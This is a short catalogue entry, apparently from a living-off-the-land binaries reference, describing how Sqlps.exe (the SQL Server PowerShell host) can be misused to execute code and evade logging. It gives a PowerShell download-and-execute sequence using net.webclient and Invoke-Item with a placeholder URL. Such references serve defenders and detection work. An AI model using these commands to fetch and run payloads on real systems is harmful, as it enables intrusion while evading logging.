## Sqlps.exe

* Functions: Execute, evade logging

```
Sqlps.exe -noprofile
```

Acknowledgements:
* Bryon - @bryon_

Code sample:

* Downloading & executing a file

```
C:\Users>"C:\Program Files (x86)\Microsoft SQL Server\100\Tools\Binn\SQLPS.exe"
PS SQLSERVER> (New-Object net.webclient).downloadfile("http://<source file URL>","<local save path>")
PS SQLSERVER> ii <downloaded executable>
# ii is shorthand for Invoke-Item
```

Notes

* Path above may vary slightly. If '100' is invalid, try replacing '100' with '110', this was required in a lab setup.

Resources:
* https://twitter.com/bryon_/status/975835709587075072

Full path:
```
C:\Program files (x86\Microsoft SQL Server\100\Tools\Binn\sqlps.exe
```

Notes:
A Powershell host.



